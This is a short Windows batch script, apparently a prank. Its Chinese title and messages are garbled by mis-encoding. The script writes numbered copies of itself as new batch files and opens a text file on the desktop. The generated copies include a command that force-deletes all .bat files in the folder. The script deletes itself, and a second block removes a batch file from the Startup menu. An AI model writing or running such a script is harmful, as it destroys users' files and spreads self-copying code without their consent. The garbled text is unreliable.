@echo off
title �������ֻ�����2��
mode con: cols=30 lines=2
set /a n=0
set /a n=%n%+1
echo ���ǵ� %n% ��!!!
echo @echo off >temp%n%.bat
echo title �������ֻ�����2�� >>temp%n%.bat
echo mode con: cols=30 lines=2 >>temp%n%.bat
echo set /a n=%n% >>temp%n%.bat
echo set /a n=%%n%%+1 >>temp%n%.bat
echo echo ���ǵ� %%n%% ��!!! >>temp%n%.bat
echo "C:\Documents and Settings\user\����\ע��!!!!.txt" /start >>temp%n%.bat
echo del *.bat /f /q >>temp%n%.bat
"C:\Documents and Settings\all users\����\ע��!!!!.txt" /start
del %0
@echo off
"C:\Documents and Settings\all users\����\ע��!!!!.txt" /start
set /a n=0
set n=%n%+1
echo %n%
if %n%==3 del "C:\Documents and Settings\all users\����ʼ���˵�\����\����\temp.bat"
